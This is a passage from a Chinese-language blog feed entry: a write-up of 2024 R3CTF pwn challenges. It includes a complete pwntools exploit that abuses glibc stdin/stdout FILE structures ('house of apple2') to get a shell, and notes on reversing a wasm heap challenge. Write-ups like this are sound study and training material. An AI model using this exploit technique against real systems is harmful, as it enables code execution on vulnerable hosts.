<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>http://example.com</id>
    <title>xsh 的世界 • Posts by &#34;r3ctf&#34; tag</title>
    <link href="http://example.com" />
    <updated>2024-07-28T17:15:33.000Z</updated>
    <category term="R3CTF" />
    <category term="mapna" />
    <category term="readme" />
    <category term="内网穿透" />
    <entry>
        <id>http://example.com/2024/07/29/2024_R3CTF_part1/</id>
        <title>2024 R3CTF patr1</title>
        <link rel="alternate" href="http://example.com/2024/07/29/2024_R3CTF_part1/"/>
        <content type="html">&lt;p&gt;​	记得六月初打这比赛被暴虐，所以想着复现下，这次只发了四道，vmware 逃逸和 sysnology TC500 都已经做了一半了，本来是想把所有题目都复现完再发的，但是这周末有师傅找我一起看 paloalto 的洞，所以就没做了，白天要上班，晚上还有其它洞要复现，感觉最近时间内是没有时间继续完成了，等有时间了再做完 part2&lt;/p&gt;
&lt;h2 id=&#34;Nullullullllu&#34;&gt;&lt;a href=&#34;#Nullullullllu&#34; class=&#34;headerlink&#34; title=&#34;Nullullullllu&#34;&gt;&lt;/a&gt;Nullullullllu&lt;/h2&gt;&lt;p&gt;这题是最简单的，在直接给 libc_base 的情况下，一次任意地址写 \x00 。&lt;/p&gt;
&lt;p&gt;直接修改 &lt;em&gt;IO_2_1_stdin&lt;/em&gt; 的 &lt;em&gt;IO_buf_base 末尾为 \x00 ，那么&lt;/em&gt; IO_buf_base 就会指向 &lt;em&gt;IO_2_1_stdin&lt;/em&gt; 的 &lt;em&gt;IO_write_base，接下来就是利用 getchar 函数触发写操作修改&lt;/em&gt;  IO_buf_base &lt;em&gt;为&lt;/em&gt; IO_2_1_stdout_ ，再次利用 getchar 函数触发写操作写 apple2 进 stdout ，printf 函数执行时候会触发 appl2 get shell。&lt;/p&gt;
&lt;p&gt;exp&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; struct &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; pack&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; ctypes &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; base64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; subprocess &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; run&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#from LibcSearcher import *&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; struct &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; pack&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; tty&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;debug&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;c = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(c):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        gdb.attach(p, c)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        gdb.attach(p)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        pause()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;get_sb&lt;/span&gt;() : &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; libc_base + libc.sym[&lt;span class=&#34;string&#34;&gt;&amp;#x27;system&amp;#x27;&lt;/span&gt;], libc_base + &lt;span class=&#34;built_in&#34;&gt;next&lt;/span&gt;(libc.search(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;/bin/sh\x00&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#-----------------------------------------------------------------------------------------&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; data : p.send(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sa  = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; text,data  :p.sendafter(text, data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sl  = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; data   :p.sendline(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sla = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; text,data  :p.sendlineafter(text, data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r   = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; num=&lt;span class=&#34;number&#34;&gt;4096&lt;/span&gt;   :p.recv(num)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rl  = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; text   :p.recvuntil(text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pr = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; num=&lt;span class=&#34;number&#34;&gt;4096&lt;/span&gt; :&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(p.recv(num))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;inter   = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt;        :p.interactive()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;l32 = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt;    :u32(p.recvuntil(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\xf7&amp;#x27;&lt;/span&gt;)[-&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;:].ljust(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;l64 = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt;    :u64(p.recvuntil(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x7f&amp;#x27;&lt;/span&gt;)[-&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;:].ljust(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;uu32    = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt;    :u32(p.recv(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;).ljust(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;uu64    = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt;    :u64(p.recv(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;).ljust(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int16   = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; data   :&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(data,&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lg= &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; s, num   :p.success(&lt;span class=&#34;string&#34;&gt;&amp;#x27;%s -&amp;gt; 0x%x&amp;#x27;&lt;/span&gt; % (s, num))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#-----------------------------------------------------------------------------------------&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(os=&lt;span class=&#34;string&#34;&gt;&amp;#x27;linux&amp;#x27;&lt;/span&gt;, arch=&lt;span class=&#34;string&#34;&gt;&amp;#x27;amd64&amp;#x27;&lt;/span&gt;, log_level=&lt;span class=&#34;string&#34;&gt;&amp;#x27;debug&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p = remote(&lt;span class=&#34;string&#34;&gt;&amp;#x27;ctf2024-entry.r3kapig.com&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;30371&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#p = remote(&amp;#x27;127.0.0.1&amp;#x27;, 9999)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf_patch = &lt;span class=&#34;string&#34;&gt;&amp;#x27;./chall&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#p = process(elf_patch)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf = ELF(elf_patch)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./libc.so.6&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sla(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;&amp;gt; &amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;b&amp;#x27;1&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rl(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;0x&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc_base = &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(r(&lt;span class=&#34;number&#34;&gt;12&lt;/span&gt;), &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;)&lt;span class=&#34;comment&#34;&gt;# + 0x6d80&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;environ = libc_base + libc.sym[&lt;span class=&#34;string&#34;&gt;&amp;#x27;__environ&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system, binsh = get_sb()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stdin = libc_base + libc.sym[&lt;span class=&#34;string&#34;&gt;&amp;#x27;_IO_2_1_stdin_&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stdin_IO_buf_base = stdin + &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stdin_old_value = stdin + &lt;span class=&#34;number&#34;&gt;0x83&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stdout = libc_base + libc.sym[&lt;span class=&#34;string&#34;&gt;&amp;#x27;_IO_2_1_stdout_&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stderr = libc_base + libc.sym[&lt;span class=&#34;string&#34;&gt;&amp;#x27;_IO_2_1_stderr_&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# step 2 : printf -&amp;gt; stdout -&amp;gt; house of apple2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system, binsh = get_sb()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_IO_wfile_jumps = libc_base + &lt;span class=&#34;number&#34;&gt;0x202228&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;base_addr = stdout&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_io = &lt;span class=&#34;string&#34;&gt;b&amp;#x27;  sh;\x00\x00\x00&amp;#x27;&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_io = fake_io.ljust(&lt;span class=&#34;number&#34;&gt;0x68&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_io += p64(system)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_io = fake_io.ljust(&lt;span class=&#34;number&#34;&gt;0x88&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_io += p64(base_addr + &lt;span class=&#34;number&#34;&gt;0x5000&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;# _lock&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_io += p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_io += p64(base_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_io = fake_io.ljust(&lt;span class=&#34;number&#34;&gt;0xd8&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_io += p64(_IO_wfile_jumps - &lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_io = fake_io.ljust(&lt;span class=&#34;number&#34;&gt;0xe0&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_io += p64(base_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sla(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;&amp;gt; &amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;b&amp;#x27;2&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sla(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;Mem: &amp;#x27;&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(stdin_IO_buf_base))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#debug(&amp;#x27;b *$rebase(0x12c3)&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sa(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;&amp;gt; &amp;#x27;&lt;/span&gt;, p64(stdin_old_value)*&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; + p64(base_addr) + p64(base_addr + &lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(fake_io) + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sleep(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sl(fake_io)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lg(&lt;span class=&#34;string&#34;&gt;&amp;#x27;libc_base&amp;#x27;&lt;/span&gt;, libc_base)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;inter()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pause()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h2 id=&#34;Feedback-Portal&#34;&gt;&lt;a href=&#34;#Feedback-Portal&#34; class=&#34;headerlink&#34; title=&#34;Feedback Portal&#34;&gt;&lt;/a&gt;Feedback Portal&lt;/h2&gt;&lt;p&gt;是一个 wasm 的堆题目，分析逆向了很久。&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/WebAssembly/wabt&#34;&gt;https://github.com/WebAssembly/wabt&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;先 clone 并且 make 上面的项目，同时利用下面的命令进行反编译&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;~/Desktop/pwn-tools/wabt/bin/wasm2wat ./chall -o wat.wasm&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;可以得到 wasm 的汇编形式的文本&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;~/Desktop/pwn-tools/wabt/bin/wasm2c ./chall -o wat.c&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;这样就得到了 wat.c 和 wat.h ，接着进行编译，方便用 ida 分析&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;gcc -c wat.c -g -o wat -I ~/path/to/wabt/wasm2c/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;就得到一个 ida 可以反汇编的二进制文件&lt;/p&gt;
&lt;p&gt;漏洞点是 delete 功能的 idx 可以越界，poc 可以触发 crash，但是程序的堆管理是另外一套，不是 ptmalloc，所以在没有定位程序加载后的内存地址的情况下，不好做&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/07/29/2024_R3CTF_part1/6b7e0db599637f7ccf93399edba6fb28.png&#34; alt=&#34;6b7e0db599637f7ccf93399edba6fb28&#34;&gt;&lt;/p&gt;
&lt;p&gt;poc&lt;/p&gt;
